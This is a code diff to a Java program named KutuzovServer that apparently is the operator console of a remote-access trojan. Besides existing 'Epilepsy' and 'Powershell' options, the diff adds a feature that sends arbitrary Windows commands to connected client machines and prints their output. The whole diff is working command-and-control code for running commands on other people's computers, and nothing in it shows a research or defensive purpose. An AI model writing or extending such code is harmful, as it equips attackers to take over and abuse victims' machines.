@@ -231,6 +231,7 @@ public class KutuzovServer {
         pnl("  0) Go back");
         pnl("  1) Epilepsy");
         pnl("  2) Powershell");
+        pnl("  3) Execute cmd command");
         pwl("Option: ");
 
         String input = readLine();
@@ -274,6 +275,35 @@ public class KutuzovServer {
                 } catch (IOException exception) {
                     pnl("Failed to send powershell command to [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
                     exception.printStackTrace();
+                    readLine();
+                }
+            } break;
+
+            case 3: {
+                clearConsole();
+                pwl("Command: ");
+                String command = readLine();
+                try {
+                    client.getOutput().writeObject(new SCWinCommandPacket(command));
+                    Packet packet = null;
+                    while(packet == null || !(packet instanceof CSWinCommandResponsePacket)) {
+                        try {
+                            packet = (Packet) client.getInput().readObject();
+                        } catch (OptionalDataException exception) { } catch (IOException exception) {
+                            pnl("Failed to receive response from [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
+                            readLine();
+                            break;
+                        } catch (Exception exception) { }
+                    }
+
+                    if(packet == null)
+                        return;
+                    CSWinCommandResponsePacket responsePacket = (CSWinCommandResponsePacket)packet;
+                    String response = responsePacket.response;
+                    pnl("Response: \n  " + response);
+                    readLine();
+                } catch (IOException exception) {
+                    pnl("Failed to send windows command to [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
                     readLine();
                 }
             } break;
